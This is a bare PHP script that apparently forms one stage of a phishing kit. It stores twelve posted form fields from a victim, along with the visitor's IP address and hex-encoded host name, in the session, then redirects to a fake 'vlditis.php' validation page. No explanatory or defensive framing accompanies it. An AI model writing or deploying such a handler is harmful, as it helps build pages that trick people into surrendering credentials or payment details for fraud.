<?php
ini_set("output_buffering",4096);
session_start();
$ip = getenv("REMOTE_ADDR");
$hosnm = bin2hex ($_SERVER['HTTP_HOST']);
$_SESSION['txt3'] = $_POST['txt3'];
$_SESSION['txt5'] = $_POST['txt5'];
$_SESSION['txt6'] = $_POST['txt6'];
$_SESSION['txt7'] = $_POST['txt7'];
$_SESSION['txt8'] = $_POST['txt8'];
$_SESSION['txt9'] = $_POST['txt9'];
$_SESSION['txt10'] = $_POST['txt10'];
$_SESSION['txt11'] = $_POST['txt11'];
$_SESSION['txt12'] = $_POST['txt12'];
$_SESSION['txt13'] = $_POST['txt13'];
$_SESSION['txt14'] = $_POST['txt14'];
header("Location: vlditis.php?valid=true&header_location=$hosnm&$ip").md5(time());
?>
